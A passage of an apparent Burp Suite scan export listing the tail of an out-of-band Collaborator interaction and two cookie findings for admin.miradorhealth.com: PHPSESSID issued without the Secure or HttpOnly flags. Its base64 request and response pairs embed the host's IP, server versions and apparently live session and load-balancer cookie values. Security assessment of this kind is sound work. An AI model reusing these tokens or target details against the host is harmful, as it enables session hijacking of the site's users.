        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHVycDl4dmlhZHJrNTVwZTJhOTYydjF2NG12c3BnbWphYzkwem5wYmUub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncHZnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>4146044931196457984</serialNumber>
    <type>5243392</type>
    <name><![CDATA[TLS cookie without secure flag set]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/robots.txt]]></path>
    <location><![CDATA[/robots.txt]]></location>
    <severity>Medium</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If the secure flag is set on a cookie, then browsers will not submit the cookie in any requests that use an unencrypted HTTP connection, thereby preventing the cookie from being trivially intercepted by an attacker monitoring network traffic. If the secure flag is not set, then the cookie will be transmitted in clear-text if the user visits any HTTP URLs within the cookie's scope. An attacker may be able to induce this event by feeding a user suitable links, either directly or via another web site. Even if the domain that issued the cookie does not host any content that is accessed over HTTP, an attacker may be able to use links of the form http://example.com:443/ to perform the same attack.</p>
<p>To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The secure flag should be set on all cookies that are used for transmitting sensitive data when accessing content over HTTPS. If cookies are used to transmit session tokens, then areas of the application that are accessed over HTTPS should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/614.html">CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following cookie was issued by the application and does not have the secure flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[Session: PHPSESSID]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9yb2JvdHMudHh0IEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDMwMiBGb3VuZA0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo0MjoyMiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMA0KTG9jYXRpb246IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NClNldC1Db29raWU6IEFXU0FMQj1CVkE2V0sxTUsyMXlldnNpOFZTOENIR09OeUpCeHdScUtySG1BU1ZCK2plOW9VQ3hzN0dCcXZQdmo1RmpVR0VCKzNEdjloMVYyNHdTdGhYVm1PWVZTUWoxUmEwUjQ0Yy9iSzk0Ynd0UXJlMm1GaE9Cclp6eWJsYnd1UHczOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NDI6MjIgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9QlZBNldLMU1LMjF5ZXZzaThWUzhDSEdPTnlKQnh3UnFLckhtQVNWQitqZTlvVUN4czdHQnF2UHZqNUZqVUdFQiszRHY5aDFWMjR3U3RoWFZtT1lWU1FqMVJhMFI0NGMvYks5NGJ3dFFyZTJtRmhPQnJaenlibGJ3dVB3MzsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjQyOjIyIEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpTZXQtQ29va2llOiBQSFBTRVNTSUQ9dWxhMGFodG45MHI3N20wcDduNnNuanNnN2k7IHBhdGg9Lw0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1437707604093532160</serialNumber>
    <type>5244416</type>
    <name><![CDATA[Cookie without HttpOnly flag set]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/robots.txt]]></path>
    <location><![CDATA[/robots.txt]]></location>
    <severity>Low</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.</p>
<p>You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting">Web Security Academy: Exploiting XSS vulnerabilities</a></li><li><a href="https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens#httponly">HttpOnly effectiveness</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li><li><a href="https://capec.mitre.org/data/definitions/31.html">CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following cookie was issued by the application and does not have the HttpOnly flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[Session: PHPSESSID]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9yb2JvdHMudHh0IEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDMwMiBGb3VuZA0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo0MjoyMiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMA0KTG9jYXRpb246IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NClNldC1Db29raWU6IEFXU0FMQj1CVkE2V0sxTUsyMXlldnNpOFZTOENIR09OeUpCeHdScUtySG1BU1ZCK2plOW9VQ3hzN0dCcXZQdmo1RmpVR0VCKzNEdjloMVYyNHdTdGhYVm1PWVZTUWoxUmEwUjQ0Yy9iSzk0Ynd0UXJlMm1GaE9Cclp6eWJsYnd1UHczOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NDI6MjIgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9QlZBNldLMU1LMjF5ZXZzaThWUzhDSEdPTnlKQnh3UnFLckhtQVNWQitqZTlvVUN4czdHQnF2UHZqNUZqVUdFQiszRHY5aDFWMjR3U3RoWFZtT1lWU1FqMVJhMFI0NGMvYks5NGJ3dFFyZTJtRmhPQnJaenlibGJ3dVB3MzsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjQyOjIyIEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpTZXQtQ29va2llOiBQSFBTRVNTSUQ9dWxhMGFodG45MHI3N20wcDduNnNuanNnN2k7IHBhdGg9Lw0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
</issues>
